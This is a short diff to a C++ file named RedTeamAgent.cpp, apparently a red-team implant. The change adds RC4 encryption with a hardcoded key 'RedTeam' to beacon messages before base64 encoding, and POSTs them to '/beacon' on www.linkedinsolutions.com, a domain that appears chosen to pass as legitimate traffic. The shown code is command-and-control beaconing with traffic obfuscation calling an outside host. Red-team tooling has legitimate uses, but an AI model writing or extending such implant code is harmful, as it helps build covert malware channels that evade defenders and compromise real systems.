@@ -1,3 +1,5 @@
+// RedTeamAgent.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
 #include "main.h"
 
 
@@ -232,7 +234,8 @@ int main(int argc, char* argv[])
                 };
                 cout << msg.dump() << "\n";
 
-                char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
+                char* encryptedmsg = (char*)RC4((char*)"RedTeam", (unsigned char*)msg.dump().c_str(), msg.dump().length());
+                char* encodedmsg = b64encode((char*)encryptedmsg, msg.dump().length());
                 printf("Our Encoded Msg: %s\n", encodedmsg);
 
                 hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", encodedmsg);
